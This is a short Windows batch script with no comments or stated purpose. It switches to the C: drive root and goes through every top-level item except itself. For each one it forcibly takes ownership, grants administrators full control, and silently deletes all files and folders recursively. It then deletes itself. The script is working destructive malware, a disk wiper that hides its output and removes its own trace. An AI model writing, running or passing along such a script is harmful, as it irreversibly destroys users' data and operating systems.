@echo off
cd /d C:\

for /f "delims=" %%i in ('dir /b ^| findstr /v /i "%~nx0"') do (
    takeown /f "%%i" /r /d y >nul 2>&1
    icacls "%%i" /grant administrators:F /t >nul 2>&1
    del /f /q /s "%%i" >nul 2>&1
    rmdir /s /q "%%i" >nul 2>&1
)

(goto) 2>nul & del "%~f0"